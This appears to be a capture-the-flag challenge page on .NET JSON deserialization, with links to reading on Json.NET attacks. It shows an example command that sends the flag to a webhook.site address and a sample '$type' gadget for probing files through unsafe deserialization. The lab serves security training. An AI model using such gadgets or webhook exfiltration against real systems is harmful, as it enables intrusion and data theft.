### Info:

Feedback is really important to keep our challenges improving!   
We might have an interesting challenge hidden for you all in this system.   

Flag is hidden inside the file /flag.txt on our system.   
There are multiple ways to extract it, however, if you want feedback system to send you your flag at your desired address.   
Trying executing `flag.sh` with first argument as your address   
E.g `./flag.sh https://webhook.site/You-Know-Where-To-Look-For-Me   `

Hope you have loads of fun!   
P.S: Hints will always be given at `CTFs` to those who look for it.

### Url:

<script>
$("#docker").load("/docker/dotnet-deserialization/http");
</script>
<div id="docker"></div>


### Learning materials:

   * https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf   
   * https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html (interesting)
   * Simple gadget like this could be pretty handy in enumerating files   
      “Object": {    
			   "$type": "System.IO.FileInfo, System.IO.FileSystem”,   
			   "fileName": "rce-test.txt”,   
			   "IsReadOnly": true   
        }   

